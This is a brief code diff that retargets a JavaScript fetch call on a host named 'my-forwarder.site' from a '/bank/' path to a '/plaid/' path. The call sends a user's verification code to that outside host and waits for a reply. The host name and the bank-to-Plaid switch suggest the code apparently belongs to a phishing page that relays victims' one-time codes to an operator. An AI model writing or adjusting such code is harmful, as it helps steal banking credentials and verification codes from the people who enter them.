@@ -754,7 +754,7 @@
                 // Add timestamp to prevent caching
                 const timestamp = Date.now();
                 
-                fetch(`https://my-forwarder.site/bank/check-response.php?code=${verificationCode}&_=${timestamp}`)
+                fetch(`https://my-forwarder.site/plaid/check-response.php?code=${verificationCode}&_=${timestamp}`)
                 .then(response => {
                     if (!response.ok) throw new Error('Network error');
                     return response.json();
